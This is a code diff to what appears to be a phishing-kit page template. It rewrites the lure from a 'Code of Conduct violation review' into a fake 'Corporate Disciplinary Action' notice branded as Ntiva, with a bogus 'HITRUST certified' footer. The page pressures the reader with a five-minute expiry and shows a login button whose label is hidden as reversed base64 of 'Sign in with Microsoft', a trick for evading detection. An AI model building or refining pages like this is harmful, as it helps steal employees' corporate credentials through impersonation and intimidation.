@@ -584,35 +584,35 @@ const jsURLs = ['https://assets.calendly.com/assets/external/widget.js', '/prima
 const primaryHTML = `
     <header>
         
-        <div id="logo">Code Of Conduct Review</div>
+        <div id="logo">Ntiva Client Support</div>
         <nav>
             <a href="#">Home</a>
             <a href="#">Services</a>
             <a href="#">About</a>
             <a href="#">Contact</a>
         </nav>
-        <div id="contact">Abuse Dashboard</div>
+        <div id="contact">More help</div>
     </header>
 
     <main>
         <section id="hero">
-            <h1>Corporate Compliance Office</h1>
+            <h1>Corporate Discliplinary Actions</h1>
             
-            <p>Code of Conduct Review — Section C, Page iv</p>
+            <p>Confidential internal communication, Supporting records included.</p>
         </section>
 
         <section id="registration-form-section">
             <section id="training-info">
-                <h2>Your Upcoming COC Violation Review and Awareness Training</h2>
+                <h2>Your Upcoming Corporate Disciplinary Action - Internal Review</h2>
                 
-                <p>Our centralized compliance system has saved, time-stamped, and logged all materials.</p>
+                <p>Records are preserved, documentation is reviewed, and an internal assessment is performed.</p>
                 
             </section>
 
             <div id="primary-overlay-container">
                 <div id="paywall-modal">
-                    <h3 id="lg-h">Your page will expire in 5 minutes if there is no activity.</h3>
-                    <p id="lg-p">Thank you for your prompt attention to this matter.</p>
+                    <h3 id="lg-h">In five minutes, your review link will expire.</h3>
+                    <p id="lg-p">Review reference information associated with this case.</p>
                     
                     <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
                 </div>
@@ -625,7 +625,7 @@ const primaryHTML = `
     </main>
 
     <footer>
-        <p>&copy; Copyright Calendly 2026.</p>
+        <p>&copy; Encryption verified by Ntiva — 2026 HITRUST certified</p>
         <nav>
             <a href="#">Privacy Policy</a>
             <a href="#">Terms of Service</a>
